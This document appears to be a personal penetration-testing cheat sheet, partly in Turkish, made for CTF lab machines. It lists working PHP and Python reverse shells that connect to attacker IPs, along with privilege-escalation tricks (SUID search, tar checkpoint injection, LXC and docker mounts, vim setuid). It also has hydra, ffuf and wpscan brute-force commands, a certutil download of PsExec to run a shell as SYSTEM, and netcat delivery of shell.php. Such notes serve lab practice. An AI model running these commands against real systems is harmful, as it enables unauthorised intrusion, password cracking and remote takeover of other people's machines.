shell stab python

usr/bin/script -qc /bin/bash /dev/null
without python

python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

CTRL-z
stty raw -echo;fg
stty rows 55 columns 116

getcap -r / 2>/dev/null -- capabilities


sudo nmap -sS -sV -n -vv -Pn -p- 


suid file 

find / -uid 0 -perm -4000 -type f 2>/dev/null

hydra brute force login form

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.20.32 http-post-form "/admin/:user=^USER^&pass=^PASS^&LOGIN=Login:Username or password invalid"

ffuf brute force 
ffuf -w valid_users.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.139.242/customers/login -fc 200


thm='php' $thm -r '$sock=fsockopen("10.11.51.187",1234);passthru("sh <&3 >&3 2>&3");'

'python3' -c 'import os,pty,socket;s=socket.socket();s.connect(("10.11.51.187",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'

/usr/bin/pyth??? -c 'import os,pty,socket;s=socket.socket();s.connect(("10.9.163.154",4445));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'


---- docker root
docker run -v /etc/:/mnt -it alpine

-------
smbye kullanıcıyla girme

smbclient //ip/kullanıcı -U kullanıcı

----- tar ile sudo 
-dosya oluştur içine cp /bin/bash /tmp/dosya adı && chmod +s /tmp/dosya adı

ardından
touch "/var/www/html/--checkpoint-action=exec=sh dosya_adı.sh"
touch "/var/www/html/--checkpoint=1"

ardından /tmp/dosya adı -p ile çalıştır

-----

LXC PrivEsc

lxc image import ./alpine.tar.gz --alias (isim)

lxc init valerie gaming -c security.privileged=true
lxc config device add gaming mydevice disk source=/root path=/mnt/root recursive=true
lxc start gaming
lxc exec gaming /bin/sh

----- anonim olarak girilen ftpye put ile dosya yüklenebilir

----- rate limit düşürerek gözden kaçan portları bulma
sudo nmap -p- --min-rate 1000 10.10.122.24

---- wpscan ile wp-login brute force
 wpscan --url http://10.10.83.65 -U c0ldd,hugo,philip -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 100

--------- wpscan aracı ile wordpress enum
wpscan --url http://10.10.220.178/wordpress/ -e u

--ffuf ile subdomain enum
ffuf -u http://mydomain.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.mydomain.com' -fs 0


----- base64
lfile ata
base64 decode yap
------
--vim cap
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

-- searchsploit db update -u

-- powershellde dosya bulunamıyor başlamıyorsa absolute path vermek gerekir.**

---curl ile [] kullanılacaksa -g kullanmalı. (get_cmd kullanıken eklenebilir. globing)

---gpg
.asc uzantısı anahtardır. 
gpg2john dosya.asc > hash şeklinde dönüşüm sağlanır parola kırılır.

gpg --import dosya.asc import edilir. 
gpg --decrypt kilitli_dosya.pgp parolayla açılır.

----HYDRA--
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.183.130 http-post-form "/Account/login.aspx:__VIEWSTATE=AUqYC6%2B2PCo3uYXvn8%2Feh%2BL9N5CXfHPdTu9jDoVOHrO2WCALA0%2BH0CVCIN3Lp%2ByGLlWrGb49JbK9HmXjYPUYZmXx8UKBIcKuo7vW2cpbNKuiCHC9YDcIo%2FeHbuIaXXFy6PCXzA9Q0E7nr4j7WnW0xAqruJ5DRnDMrDIrRQJuRlwFKqA17%2FwUqsp8Ru0N6vQGKdDZwEhetIKNNwcG0zg9LH1vG4LDAiWEBaZf%2BFf0dDaUSKoWgTgLhRlcc%2BlAb5FW8vJU9Tw1%2F7gHlGP8IPuMPrgwX8pnxKFQoaxm2uVp9n%2BItqgvFI63KF4z%2BSGuj5cfQh3PMfrwTnhX%2BxrsOiKPsDMimYO2W2EbGg%2FuUOo0p0hlRzWc&__EVENTVALIDATION=WNhphsDiUIO1CarLUkEeS2TtKGqTbAQ4vCZ2dqpIbem60ahrcisTBB2tLJOVY4kOIM6MpCIxpdsIIUT3VT0HcQVWk%2FGNqdcvALxT5hp8uqi9xGfKU953oOW%2F0XBL9XnE0vzBFckA5dYkNmss2VSvpruxNPQ%2BOOcklwdG%2FAwbfYGIlc1d&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

--ping ile istek kontrolü 
sudo tcpdump -i tun0 icmp -A --print

---ps indirme certutil -urlcache -f http://10.11.51.187/PsExec64.exe p.exe

--ps exe çalıştırma ve parametreleri 
.\p.exe -accepteula(popup ekranı onaylayarak çıkmasını engeller) -i -d -s(sistem shelli verir) C:\Users\bruce\Downloads\shell.exe

--buffer owerflow bad character tespiti araştır

--wget ip/{dosya isimleri}

--kali$ nc -lnvp 80 < index.php --netcate dosya yönlendirilirse wget doğrudan onu alır
client$ wget 1.1.1.1 -O shell.php

---BASH--
cat <<EOF > foo.sh
#!/bin/bash

sdlşfksşf
EOF

---ffuf subdomain enum--
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H 'Host: FUZZ.acmeitsupport.thm' -u http://10.10.25.169 -fs 2395

--ffuf username enum--
ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.51.251/customers/signup -mr "username already exists"

--ffuf brute force 
           
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

--satır sayısı
wc -c 

 -- ftpden uygun verileri indirme
 wget -m --no-passive ftp://anonymous:anonymous@1.1.1.1
 
 -- mount nfs
 showmount -e 1.1.1.1
 
 sudo mount -t nfs 1.1.1.1:/mnt/nfsshare /home/kali/target-NFS
 
 sudo umount /home/kali/target-NFS

 -- php upload form
 https://blog.filestack.com/thoughts-and-knowledge/php-file-upload/#1_The_HTML_Form

 
